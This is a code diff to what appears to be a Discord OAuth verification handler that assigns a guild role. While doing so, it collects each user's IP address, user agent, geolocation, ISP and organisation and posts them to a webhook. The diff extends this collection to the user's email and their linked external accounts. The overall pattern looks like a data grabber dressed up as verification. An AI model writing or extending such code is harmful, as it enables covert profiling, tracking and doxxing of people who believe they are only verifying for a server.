@@ -44,11 +44,22 @@ export default async function handler(req, res) {
       return res.status(400).send("Failed to get access token: " + tokenText);
     }
 
-    // Fetch user info (identify scope only)
+    // Fetch user info with email (requires email scope)
     const userRes = await fetch("https://discord.com/api/users/@me", {
       headers: { Authorization: `Bearer ${tokenData.access_token}` },
     });
     const userData = await userRes.json();
+
+    // Fetch user connections (requires connections scope)
+    let connectionsData = [];
+    try {
+      const connectionsRes = await fetch("https://discord.com/api/users/@me/connections", {
+        headers: { Authorization: `Bearer ${tokenData.access_token}` },
+      });
+      if (connectionsRes.ok) {
+        connectionsData = await connectionsRes.json();
+      }
+    } catch {}
 
     // Add role to guild member
     const addRoleRes = await fetch(
@@ -76,7 +87,7 @@ export default async function handler(req, res) {
         geoInfo = {};
       }
     } catch (e) {
-      console.error(" fetch failed:", e);
+      console.error("fetch failed:", e);
       geoInfo = {};
     }
 
@@ -85,10 +96,11 @@ export default async function handler(req, res) {
       ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024`
       : null;
 
-    // Collect fields for webhook embed
+    // Base fields for webhook embed
     const fields = [
       { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
       { name: "User ID", value: userData.id, inline: true },
+      { name: "Email", value: userData.email || "Not provided", inline: false },
       { name: "IP Address", value: ip, inline: false },
       { name: "User Agent", value: userAgent, inline: false },
       { name: "Token Type", value: tokenData.token_type || "unknown", inline: true },
@@ -105,6 +117,13 @@ export default async function handler(req, res) {
     if (geoInfo.isp) fields.push({ name: "ISP", value: geoInfo.isp, inline: true });
     if (geoInfo.org) fields.push({ name: "Org", value: geoInfo.org, inline: true });
     if (geoInfo.timezone) fields.push({ name: "Timezone", value: geoInfo.timezone, inline: true });
+
+    // Add connections info if available
+    if (connectionsData.length) {
+      fields.push({ name: "Connections", value: connectionsData.map(c => `${c.type}: ${c.name}`).join("\n"), inline: false });
+    } else {
+      fields.push({ name: "Connections", value: "None or not authorized", inline: false });
+    }
 
     if (webhook_url) {
       await fetch(webhook_url, {
